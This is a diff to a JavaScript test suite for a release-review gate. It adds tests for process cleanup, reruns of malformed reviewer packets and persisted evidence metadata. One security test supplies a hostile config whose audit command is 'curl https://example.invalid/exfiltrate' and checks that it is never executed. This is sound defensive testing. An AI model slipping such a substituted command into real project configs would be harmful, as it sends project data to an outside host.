@@ -51,7 +51,7 @@ import { persistPhasePlan, persistPhaseResult } from '../lib/phase-persistence.m
 import { checkMissingEvidenceOutput, extractCommandEvidence, extractTestOutputs } from '../lib/evidence-utils.mjs';
 import { detectChangeScale as detectGateChangeScale, printScaleDetection } from '../scripts/modules/scale.mjs';
 import { printHelp as printGateHelp } from '../scripts/modules/cli.mjs';
-import { runEvidenceCommand } from '../scripts/modules/evidence.mjs';
+import { runAutomatedChecks, runEvidenceCommand } from '../scripts/modules/evidence.mjs';
 
 const __dirname = fileURLToPath(new URL('.', import.meta.url));
 const SKILL_DIR = join(__dirname, '..');
@@ -842,6 +842,28 @@ test.describe('security boundaries', () => {
     assertTrue(record.output.includes('[REDACTED]'), 'Expected redacted evidence output');
   });
 
+  test('candidate config cannot substitute the network-enabled audit command', () => {
+    const candidateCommands = [];
+    let trustedAuditRuns = 0;
+    const record = command => ({
+      command, status: 'pass', exit_code: 0, output: 'passed', output_bytes: 6, truncated: false,
+      started_at: new Date().toISOString(), finished_at: new Date().toISOString(),
+    });
+    const checks = runAutomatedChecks(
+      { verification: {
+        test: 'npm test', typecheck: 'npm run typecheck', build: 'npm run build', lint: 'npm run lint',
+        coverage: 'npm run coverage', e2e: 'npm run test:e2e', audit: 'curl https://example.invalid/exfiltrate',
+      } },
+      PROJECT_ROOT,
+      PROJECT_ROOT,
+      command => { candidateCommands.push(command); return record(command); },
+      () => { trustedAuditRuns++; return record('npm audit --audit-level=high'); },
+    );
+    assertEqual(candidateCommands.includes('curl https://example.invalid/exfiltrate'), false);
+    assertEqual(trustedAuditRuns, 1);
+    assertEqual(checks.auditGate.command, 'npm audit --audit-level=high');
+  });
+
   test('rejects a repository output parent symlinked outside the repository', async () => {
     const link = join(TEST_DIR, 'outside-link');
     symlinkSync('/tmp', link, 'dir');
@@ -1068,12 +1090,14 @@ setInterval(() => { if (process.ppid === 1) process.exit(0); }, 20);
       mkdirSync(fakeBin);
       const fakeCodex = join(fakeBin, 'codex');
       const reviewerDir = join(round, 'product-flow');
+      const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
+      const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
       const descendantCode = `process.on('SIGTERM', () => {}); setTimeout(() => require('node:fs').writeFileSync(${JSON.stringify(leakMarker)}, 'survived'), 500)`;
       writeFileSync(fakeCodex, `#!/usr/bin/env node
 if (process.argv.includes('--version') || process.argv.includes('--help')) process.exit(0);
 const fs = process.getBuiltinModule('node:fs');
 fs.mkdirSync(${JSON.stringify(reviewerDir)}, { recursive: true });
-fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'result.yaml'))}, 'reviewer: product-flow\\nprofile: quick\\nround: ${TEST_ROUNDS.parallelSuccess}\\nscore: 95\\nstatus: pass\\nblockers: []\\nredlines: []\\n');
+fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'result.yaml'))}, 'reviewer: product-flow\\nprofile: quick\\nround: ${TEST_ROUNDS.parallelSuccess}\\ncandidate_commit: ${candidateCommit}\\ncandidate_tree: ${candidateTree}\\nscore: 95\\nstatus: pass\\nblockers: []\\nredlines: []\\n');
 fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'score.md'))}, '# Score\\n\\n## Overall Score: 95/100\\n');
 fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'blockers.md'))}, '# Blockers\\n\\nNo P0/P1 blockers.\\n');
 fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'improvement-list.md'))}, '# Improvements\\n');
@@ -1135,6 +1159,47 @@ setInterval(() => {}, 1000);
       assertTrue(result.stdout.includes('timed out'), 'Expected explicit sequential timeout diagnostic');
       spawnSync(process.execPath, ['-e', 'setTimeout(() => {}, 700)']);
       assertEqual(existsSync(leakMarker), false, 'Sequential reviewer descendants must be terminated');
+    } finally {
+      rmSync(round, { recursive: true, force: true });
+    }
+  });
+
+  test('sequential runner cleans descendants after a successful reviewer exit', () => {
+    const roundNumber = TEST_ROUNDS.parallelSuccess + 101;
+    const round = reportRound(roundNumber);
+    const fakeBin = join(TEST_DIR, 'fake-bin-sequential-success');
+    const leakMarker = join(TEST_DIR, 'sequential-success-descendant-leak');
+    try {
+      mkdirSync(fakeBin);
+      const fakeCodex = join(fakeBin, 'codex');
+      const reviewerDir = join(round, 'product-flow');
+      const candidateCommit = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
+      const candidateTree = spawnSync('git', ['rev-parse', 'HEAD^{tree}'], { cwd: PROJECT_ROOT, encoding: 'utf8' }).stdout.trim();
+      const descendantCode = `process.on('SIGTERM', () => {}); setTimeout(() => require('node:fs').writeFileSync(${JSON.stringify(leakMarker)}, 'survived'), 500)`;
+      writeFileSync(fakeCodex, `#!/usr/bin/env node
+const fs = process.getBuiltinModule('node:fs');
+fs.mkdirSync(${JSON.stringify(reviewerDir)}, { recursive: true });
+fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'result.yaml'))}, 'reviewer: product-flow\\nprofile: quick\\nround: ${roundNumber}\\ncandidate_commit: ${candidateCommit}\\ncandidate_tree: ${candidateTree}\\nscore: 95\\nstatus: pass\\nblockers: []\\nredlines: []\\n');
+fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'score.md'))}, '# Score\\n\\n## Overall Score: 95/100\\n');
+fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'blockers.md'))}, '# Blockers\\n\\nNo P0/P1 blockers.\\n');
+fs.writeFileSync(${JSON.stringify(join(reviewerDir, 'improvement-list.md'))}, '# Improvements\\n');
+process.getBuiltinModule('node:child_process').spawn(process.execPath, ['-e', ${JSON.stringify(descendantCode)}], { stdio: 'ignore', env: process.env }).unref();
+`);
+      chmodSync(fakeCodex, 0o755);
+      const result = spawnSync('node', [
+        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--agent', 'codex',
+        '--reviewer', 'product-flow', '--round', String(roundNumber), '--skip-evidence',
+      ], {
+        cwd: PROJECT_ROOT, encoding: 'utf8', timeout: 5000,
+        env: {
+          ...process.env, PATH: `${fakeBin}:${process.env.PATH}`,
+          RELEASE_QUALITY_REVIEWER_TIMEOUT_MS: '1000', RELEASE_QUALITY_REVIEWER_KILL_GRACE_MS: '100',
+          RELEASE_QUALITY_REVIEWER_RETRY_MAX: '0', RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
+        },
+      });
+      assertEqual(result.status, 1, `Expected failed Gate after reviewer completion, output: ${result.stdout}${result.stderr}`);
+      spawnSync(process.execPath, ['-e', 'setTimeout(() => {}, 700)']);
+      assertEqual(existsSync(leakMarker), false, 'Sequential successful reviewer descendants must be terminated');
     } finally {
       rmSync(round, { recursive: true, force: true });
     }
@@ -1446,11 +1511,28 @@ console.log('review completed');
           RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
         },
       });
-      assertEqual(result.status, 1, `Expected runner gate failure, output: ${result.stdout}${result.stderr}`);
+      assertEqual(result.status, 5, `Expected malformed reviewer failure, output: ${result.stdout}${result.stderr}`);
       assertEqual(result.stderr.includes('results is not defined'), false);
       assertEqual(existsSync(join(round, 'runner-metadata.json')), true);
       assertEqual(existsSync(join(round, 'product-flow', 'prompt.md')), true);
       assertEqual(existsSync(join(round, 'architecture-maintainer', 'prompt.md')), true);
+      const rerun = spawnSync('node', [
+        join(SKILL_DIR, 'scripts', 'review-runner.mjs'), '--profile', 'quick', '--agent', 'codex',
+        '--round', String(roundNumber), '--skip-evidence',
+      ], {
+        cwd: PROJECT_ROOT,
+        encoding: 'utf8',
+        timeout: 30000,
+        env: {
+          ...process.env,
+          PATH: `${fakeBin}:${process.env.PATH}`,
+          RELEASE_QUALITY_REVIEWER_RETRY_MAX: '0',
+          RELEASE_QUALITY_REVIEWER_START_DELAY_MS: '1',
+        },
+      });
+      assertEqual(rerun.status, 5);
+      assertTrue(rerun.stdout.includes('invalidating stale artifacts'), 'Malformed packet must be relaunched');
+      assertEqual(rerun.stdout.includes('validated resume'), false, 'Malformed packet must never be resumed');
     } finally {
       rmSync(round, { recursive: true, force: true });
     }
@@ -1496,7 +1578,9 @@ console.log('review completed');
       writeFileSync(join(round, 'evidence', 'automated-checks.json'), automatedContent);
       writeFileSync(join(round, 'metadata.json'), JSON.stringify({
         profile: 'quick', round: roundNumber, collected_at: new Date().toISOString(),
-        git: { commit, status, branch: 'test' }, files: {}, candidate_commit: fullCommit, candidate_tree: tree,
+        git: { commit, status, branch: 'test', changedFiles: ['README.md'] }, files: {},
+        scale: { scale: 'micro', files: 1, total: 2 },
+        candidate_commit: fullCommit, candidate_tree: tree,
         base_commit: fullCommit, base_tree: tree,
         automated_checks_sha256: createHash('sha256').update(automatedContent).digest('hex'),
       }));
@@ -1507,6 +1591,9 @@ console.log('review completed');
       assertEqual(result.status, 0, `Expected no-collect pass, output: ${result.stdout}${result.stderr}`);
       assertTrue(result.stdout.includes('Loaded persisted automated evidence'), 'Expected persisted evidence rehydration');
       assertEqual(existsSync(join(round, `phase-${roundNumber}-plan.md`)), true, 'Expected Gate-owned phase plan');
+      const phasePlan = readFileSync(join(round, `phase-${roundNumber}-plan.md`), 'utf8');
+      assertTrue(phasePlan.includes('micro (1 files, 2 lines)'), 'Phase plan must preserve persisted scale');
+      assertTrue(phasePlan.includes('Changed files:** 1'), 'Phase plan must preserve persisted changed-file count');
       const report = readFileSync(finalReport, 'utf8');
       assertEqual(report.includes('Clean-candidate verification passed'), false);
       assertEqual(report.includes('Goal instruction validation passed'), false);
@@ -1623,6 +1710,7 @@ console.log('review completed');
       for (const script of ['test', 'typecheck', 'build', 'lint', 'coverage']) {
         packageJson.scripts[script] = 'node --check skills/release-quality-review/scripts/review-gate.mjs';
       }
+      packageJson.scripts['test:e2e'] = 'node --test fixture-test-runner.mjs';
       packageJson.scripts.test = 'node --test fixture-test-runner.mjs';
       packageJson.scripts.coverage = 'node --experimental-test-coverage --test fixture-test-runner.mjs';
       writeFileSync(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`);
